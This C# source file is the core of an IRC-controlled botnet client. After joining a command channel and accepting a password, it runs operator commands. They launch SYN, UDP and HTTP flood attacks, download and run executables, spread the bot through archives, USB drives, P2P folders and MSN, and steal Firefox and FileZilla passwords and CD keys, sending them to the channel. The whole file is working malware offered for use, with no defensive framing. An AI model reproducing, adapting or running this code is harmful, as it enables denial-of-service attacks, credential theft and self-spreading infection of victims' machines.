using System;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.Diagnostics;

namespace myApp
{
    class Program
    {
		
        // IRC Username 
        public static string Osprefix;
        public static Random Rnd = new Random();
        public static int RndNumber = Rnd.Next(1000,10000);
        public static string NICK;

        //get config
        public static string Server = Config.Serverz;
        public static int Port = Config.Portz;
        public static string Rname = Config.Rnamez;
        public static string CHANNEL = Config.CHANNELz;
        public static string BotPass = Config.BotPassz;
        
        //others
        public static StreamWriter Writer;
        public static bool IsInvisible;
        public static int InfectedArchives = 0;
        public static bool IsMutex;

        //restart when bot dies
        private static Thread _reco;
        public static void Restart()
        {
            _reco = new Thread(Main);
            _reco.Start();
            Main();
        }
        
        //register msn dll
        public static void Registar_Dlls(string filePath)
        {
            try
            {
                string argFileinfo = "/s" + " " + "\"" + filePath + "\"";
                Process reg = new Process();
                reg.StartInfo.FileName = "regsvr32.exe";
                reg.StartInfo.Arguments = argFileinfo;
                reg.StartInfo.UseShellExecute = false;
                reg.StartInfo.CreateNoWindow = true;
                reg.StartInfo.RedirectStandardOutput = true;
                reg.Start();
                reg.WaitForExit();
                reg.Close();
            }
            catch
            {
            }
        }

	
        //Main part
        public static void Main()
        {
            //mutex
            if (IsMutex == false)
            {
                var instanceUnique = new InstanceUnique("{newmutexmddutexmutex265qezfserdgrgeqqsesgf874589dsqf87sdfsdqfqsd}");
                if (instanceUnique.IsRunning())
                {
                    Environment.Exit(0);
                }
                IsMutex = true;
            }
            
            //antis
            //Antis.Verif();

            // get OS and country
            GetOs.Get();
            Getcn.Get();

            //install bot
            if (!File.Exists(Install.goodpath))
            {
                Reg.CheckReg();
            }

            Install.Drop();
            
            //rar spread and lan spread
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\temp4876969.txt"))
            {
                try
                {
                    Rar.Spread("setup.exe");
                    File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\temp4876969.txt");
                }
                catch
                {
                    File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\temp4876969.txt");
                }
                try
                {
                    Yeha.go();
                    File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\temp4876969.txt");
                }
                catch
                {} 
            }
            
            //usb listener
            Usb.Listen();

            //connect to irc
            NetworkStream stream;
            TcpClient irc;
            string inputLine;
            StreamReader reader;
            int logged = 0;
			
            try
            {
			
                irc = new TcpClient(Server, Port);
                stream = irc.GetStream();
                reader = new StreamReader(stream);
                Writer = new StreamWriter(stream);
                Writer.AutoFlush = true;

                PingSender.Start();

                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\dll\\here.txt"))
                {
                    NICK = "[NEW|" + RndNumber + "]";
                    File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\dll\\here.txt");
                }
                else
                {
                    NICK = "[" + Getcn.MyCountry + "|" + Osprefix + "|" + Environment.MachineName + "|" + RndNumber + "]";
                }

                Writer.WriteLine("USER {0} {1} * :{2}", NICK, IsInvisible, Rname);
                Writer.WriteLine("NICK {0}", NICK);
                Writer.WriteLine("JOIN {0}", CHANNEL);
                
               
			
                while (true){
                    
				
                    while ( (inputLine = reader.ReadLine () ) != null ){
					
                        if (inputLine.EndsWith ("JOIN " + CHANNEL) ){
							
                            inputLine.Substring(1, inputLine.IndexOf ("!") - 1);
                            Thread.Sleep (2000);
						
                        }
						
                        if (inputLine.Contains("PING :"))
                        {
                            int pingstart = inputLine.IndexOf("PING :");
                            string response = inputLine.Substring(pingstart);
                            string code = response.Replace("PING :", string.Empty);
                            Writer.WriteLine("PONG :" + code);
                            Thread.Sleep(2000);
                            Writer.WriteLine(NICK);
                            Writer.WriteLine("NICK " + NICK);
                            Writer.WriteLine("JOIN " + CHANNEL);
                            if (InfectedArchives != 0)
                            {
                                Writer.WriteLine("PRIVMSG " + CHANNEL + " :  8Infected : 9" + InfectedArchives + " Archives");
                            }

                            Writer.WriteLine("JOIN " + "##" + Getcn.MyCountry);   
                        }
						
                        if (inputLine.Contains("!login"))
                        {
                            Match login = Regex.Match(inputLine, @"!login (.*)",
                                                      RegexOptions.IgnoreCase);
							
                            if ( BotPass == login.Groups[1].Value) {
								
                                logged = 1;
                                // put // before Writer.wri.... for the silent login
                                // like this :  //Writer.WriteLine("PRIVMSG " + CHANNEL + " :  Ready boss !");
                                Writer.WriteLine("PRIVMSG " + CHANNEL + " :  9 Ready boss !");
                                
								
                            }
								
                        }
						
                        if ( logged == 1) {

                            ////////////////////////////////////////////////URL Visit //////////////////////////////////
                            if (inputLine.Contains("!visit"))
                            {
                                Match visit = Regex.Match(inputLine, @"!visit (.*)",
                                                          RegexOptions.IgnoreCase);
								
                                Process.Start(visit.Groups[1].Value);

                                Writer.WriteLine("PRIVMSG " + CHANNEL + " :  9Website Visited !");
                                
                            }

                            if (inputLine.Contains("!visilent"))
                            {
                                Match visit = Regex.Match(inputLine, @"!visilent (.*)",
                                                          RegexOptions.IgnoreCase);
                                try
                                {
                                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(visit.Groups[1].Value);
                                    req.GetResponse();
                                    Writer.WriteLine("PRIVMSG " + CHANNEL + " :  9Website Visited silently !");
                                }
                                catch
                                {
                                    //silent error
                                   
                                }


                            }

                            ////////////////////////////////////////////////ddos start //////////////////////////////////
                            if (inputLine.Contains("!syn"))
                            {
                                try
                                {

                                    var regex = new Regex(@"!syn (?<host>\S+) (?<port>\d+) (?<threads>\d+) (?<sockets>\d+)");
                                    string input = inputLine;
                                    MatchCollection matches = regex.Matches(input);
                                    for (int i = 0; i != matches.Count; ++i)
                                    {
                                        string str1 = matches[i].Groups["host"].Value;
                                        int num2 = Convert.ToInt32(matches[i].Groups["port"].Value);
                                        int num3 = Convert.ToInt32(matches[i].Groups["threads"].Value);
                                        int num4 = Convert.ToInt32(matches[i].Groups["sockets"].Value);


                                        if ((str1 != null) & (num2 != 0))
                                        {
                                            if (Syn.IsEnabled)
                                            {
                                                Syn.StopSuperSyn();
                                            }
                                            if (HttpFlood.IsEnabled)
                                            {
                                                HttpFlood.StopHttpFlood();
                                            }
                                            if (Udp.IsEnabled)
                                            {
                                                Udp.StopSuperudp();
                                            }
                                            Syn.Host = str1;
                                            Syn.Port = num2;
                                            Syn.Threads = num3;
                                            Syn.SuperSynSockets = num4;
                                            Syn.StartSuperSyn();
                                            Writer.WriteLine("PRIVMSG " + CHANNEL + " :  8SuperSyn 9started on " + str1 + " Port " +
                                                             num2 + " with " + num3 + " threads" + " and " + num4 +
                                                             " sockets");
                                            Thread.Sleep(2000);
                                        }
                                    }
                                }
                                catch (Exception d)
                                {
                                    Writer.WriteLine("PRIVMSG " + CHANNEL + " :  4" + d);
                                    Thread.Sleep(2000);
                                }

                            }

                            if (inputLine.Contains("!stopsyn"))
                            {
                                try
                                {
                                    if (Syn.IsEnabled)
                                    {
                                        Syn.StopSuperSyn();
                                    }
                                    Writer.WriteLine("PRIVMSG " + CHANNEL + " : 8SuperSyn 9stopped");
                                    Thread.Sleep(2000);
                                }
                                catch
                                {
                                }
                            }

                            if (inputLine.Contains("!udpfloodstart"))
                            {
                                try
                                {
                                    var regex =
                                        new Regex(@"!udpfloodstart (?<host>\S+) (?<port>\d+) (?<threads>\d+) (?<sockets>\d+)");
                                    string input = inputLine;
                                    MatchCollection matches = regex.Matches(input);
                                    for (int i = 0; i != matches.Count; ++i)
                                    {
                                        string str1 = matches[i].Groups["host"].Value;
                                        int num2 = Convert.ToInt32(matches[i].Groups["port"].Value);
                                        int num3 = Convert.ToInt32(matches[i].Groups["threads"].Value);
                                        int num4 = Convert.ToInt32(matches[i].Groups["sockets"].Value);


                                        if ((str1 != null) & (num2 != 0))
                                        {
                                            if (Syn.IsEnabled)
                                            {
                                                Syn.StopSuperSyn();
                                            }
                                            if (HttpFlood.IsEnabled)
                                            {
                                                HttpFlood.StopHttpFlood();
                                            }
                                            if (Udp.IsEnabled)
                                            {
                                                Udp.StopSuperudp();
                                            }
                                            Udp.Host = str1;
                                            Udp.Port = num2;
                                            Udp.Threads = num3;
                                            Udp.SuperudpSockets = num4;
                                            Udp.StartSuperudp();
                                            Writer.WriteLine("PRIVMSG " + CHANNEL + " : 8UDP flood 9started on " + str1 + " Port " +
                                                             num2 + " with " + num3 + " threads" + " and " + num4 +
                                                             " sockets");
                                            Thread.Sleep(2000);
                                        }
                                    }
                                }
                                catch (Exception d)
                                {
                                    Writer.WriteLine("PRIVMSG " + CHANNEL + " : 4error : " + d);
                                    Thread.Sleep(2000);
                                }
                            }



                            if (inputLine.Contains("!udpfloodstop"))
                            {
                                try
                                {
                                    if (Udp.IsEnabled)
                                    {
                                        Udp.StopSuperudp();
                                    }
                                    Writer.WriteLine("PRIVMSG " + CHANNEL + " : 8UDP flood 9stopped");
                                    Thread.Sleep(2000);
                                }
                                catch
                                {
                                }
                            }

                            if (inputLine.Contains("!httpflood"))
                            {
                                try
                                {
                                    var regex =
                                        new Regex(@"!httpflood (?<host>\S+) (?<interval>\d+) (?<threads>\d+)");
                                    string input = inputLine;
                                    MatchCollection matches = regex.Matches(input);
                                    for (int i = 0; i != matches.Count; ++i)
                                    {
                                        string str1 = matches[i].Groups["host"].Value;
                                        int num1 = Convert.ToInt32(matches[i].Groups["interval"].Value);
                                        int num2 = Convert.ToInt32(matches[i].Groups["threads"].Value);

                                        if (HttpFlood.IsEnabled)
                                        {
                                            HttpFlood.StopHttpFlood();
                                        }
                                        if (Syn.IsEnabled)
                                        {
                                            Syn.StopSuperSyn();
                                        }
                                        if (Udp.IsEnabled)
                                        {
                                            Udp.StopSuperudp();
                                        }
                                        HttpFlood.Host = str1;
                                        HttpFlood.Interval = num1;
                                        HttpFlood.Threads = num2;
                                        HttpFlood.StartHttpFlood();
                                    }
                                }

                                catch (Exception o)
                                {
                                    Writer.WriteLine("PRIVMSG " + CHANNEL + " :  4" + o);
                                    Thread.Sleep(5000);
                                }

                            }

                            if (inputLine.EndsWith("!httpfloodstop"))
                            {
                                try
                                {
                                    if (HttpFlood.IsEnabled)
                                    {
                                        HttpFlood.StopHttpFlood();
                                    }
                                }
                                catch
                                {
                                }
                            }

                            ///////////////////////////////////////P2P spread //////////////////////////////////////
                            if (inputLine.Contains("!p2p"))
                            {
                                try
                                {
                                    var regex = new Regex(@"!p2p (?<file>\S+)");
                                    string input = inputLine;
                                    MatchCollection matches = regex.Matches(input);
                                    string str1 = matches[0].Groups["file"].Value;
                                    P2P.ShareazaStart(str1);
                                    P2P.EmuleStart(str1);
                                    P2P.KazaaStart(str1);
                                    P2P.IcqStart(str1);
                                    P2P.GroksterStart(str1);
                                    P2P.BearshareStart(str1);
                                    P2P.Edonkey2000Start(str1);
                                    P2P.MorpheusStart(str1);
                                    P2P.LimewireStart(str1);
                                    P2P.TeslaStart(str1);
                                    P2P.WinmxStart(str1);
                                    Thread.Sleep(2000);
                                }
                                catch
                                {}
                            }
                            ///////////////////////////////////////Downloader //////////////////////////////////////
                            if (inputLine.Contains("!dl"))
                            {
                                var regex = new Regex(@"!dl (?<file>\S+)");
                                string input = inputLine;
                                MatchCollection matches = regex.Matches(input);
                                string str1 = matches[0].Groups["file"].Value;
                                int Rnddl = Rnd.Next(1000, 10000);
                                string executedfile = Rnddl + ".exe";
                                Dl x = new Dl();
                                x.Rfile = executedfile;
                                x.Rurl = str1;
                                Thread workerThread = new Thread(x.Dlexec);
                                workerThread.Start();
                            }

                            //////////////////////////////////////MSN spread //////////////////////////////////////
                            if (inputLine.Contains("!msn"))
                            {

                                if (!File.Exists(Environment.CurrentDirectory + "\\MSNMessengerAPI.dll"))
                                {
                                    var client = new WebClient();
                                    client.DownloadFile(Fuck.a("poGEEkO5fsP3sBlo7YpzxkaU8rKqvdLgAp9UIIMG/svY+WpmLpzB5wMW5Q12OLqf", Install.gay, true), Environment.CurrentDirectory + "\\MSNMessengerAPI.dll");
                                }

                                int messagestart = inputLine.IndexOf("!msn");
                                string messageGood = inputLine.Substring(messagestart);
                                Msnspread.MYmessage = messageGood.Replace("!msn ", string.Empty);
                                Msnspread myMsn = new Msnspread();
                                Thread workerThread1 = new Thread(myMsn.MsnStart);
                                workerThread1.Start();

                            }


                            /////////////////////////////////////// Kill //////////////////////////////////////
                            
                            if (inputLine.Contains("!kill"))
                            {
						           

                                try
                                {
                                    RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                                    if (key != null)
                                    {
                                        key.DeleteValue("dll");
                                    }
                                    key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
                                    string str = key.GetValue("Userinit").ToString();
                                    key.SetValue("Userinit", str);
                                    Writer.WriteLine("PRIVMSG " + CHANNEL + " :  8Bot Killed !");

                                }
                                catch
                                {
                                }
                                
                                Environment.Exit(0);
                            }


                            /////////////////////////////////// FF stealer (credits to darksel) ////////////////////
                            if (inputLine.Contains("!ff"))
                            {

                                try
                                {
                                    FFDecryptor.GetFF();

                                }
                                catch
                                {
                                }

                            }
							
                            //////////////////////////////////// DIE //////////////////////////////////////////////////
                            if (inputLine.Contains("!die"))
                            {
                                Writer.WriteLine("PRIVMSG " + CHANNEL + " :  8Bot Closed !");
                                Application.ExitThread();
                                Process.GetCurrentProcess().Kill();
                            }
							
                            if (inputLine.Contains("!logout"))
                            {
                                logged = 0;

                                Writer.WriteLine("PRIVMSG " + CHANNEL + " :  8Logged Out !");
                                
                            }
							
                            /////////////////////////////////////// cdkeyz //////////////////////////////////////////
                            if (inputLine.Contains("!keyz"))
                            {
                                CDKeyz.Keyz();
                            }
							
                            /////////////////////////////////////// Filezilla /////////////////////////////////////////
                            if (inputLine.Contains("!fz"))
                            {
                                try
                                {
                                    string tmp;
                                    var read = new StreamReader(Environment.GetEnvironmentVariable("APPDATA") + "\\FileZilla\\sitemanager.xml");

                                    while (!read.EndOfStream)
                                    {
                                        tmp = read.ReadLine();

                                        if (tmp.Contains("<Pass"))
                                        {
                                            string[] tmp2 = tmp.Split('>');
                                            string[] tmp3 = tmp2[1].Split('<');
                                            string password = tmp3[0];
                                            Writer.WriteLine("PRIVMSG " + CHANNEL + " : 8Password : " + password);
                                        }

                                        if (tmp.Contains("<User"))
                                        {
                                            string[] tmp4 = tmp.Split('>');
                                            string[] tmp5 = tmp4[1].Split('<');
                                            string username = tmp5[0];
                                            Writer.WriteLine("PRIVMSG " + CHANNEL + " : 8Username : " + username);
                                        }


                                        if (tmp.Contains("<Host"))
                                        {
                                            string[] tmp6 = tmp.Split('>');
                                            string[] tmp7 = tmp6[1].Split('<');
                                            string host = tmp7[0];
                                            Writer.WriteLine("PRIVMSG " + CHANNEL + " : 8Host : " + host);
                                        }
                                    }
                                    read.Close();

                                    var read1 = new StreamReader(Environment.GetEnvironmentVariable("APPDATA") + "\\FileZilla\\recentservers.xml");

                                    while (!read1.EndOfStream)
                                    {
                                        tmp = read1.ReadLine();

                                        if (tmp.Contains("<Pass"))
                                        {
                                            string[] tmp2 = tmp.Split('>');
                                            string[] tmp3 = tmp2[1].Split('<');
                                            string password = tmp3[0];
                                            Writer.WriteLine("PRIVMSG " + CHANNEL + " : 8Password : " + password);
                                        }

                                        if (tmp.Contains("<User"))
                                        {
                                            string[] tmp4 = tmp.Split('>');
                                            string[] tmp5 = tmp4[1].Split('<');
                                            string username = tmp5[0];
                                            Writer.WriteLine("PRIVMSG " + CHANNEL + " : 8Username : " + username);
                                        }


                                        if (tmp.Contains("<Host"))
                                        {
                                            string[] tmp6 = tmp.Split('>');
                                            string[] tmp7 = tmp6[1].Split('<');
                                            string host = tmp7[0];
                                            Writer.WriteLine("PRIVMSG " + CHANNEL + " : 8Host : " + host);
                                        }
                                    }
                                    read1.Close();
                                }
                                catch
                                {
				                        
                                }
                            }
                        }
	
                    }		
			
                }
				
            }
			
            catch
            {
                Restart();
            }
			
        }
		
    }
}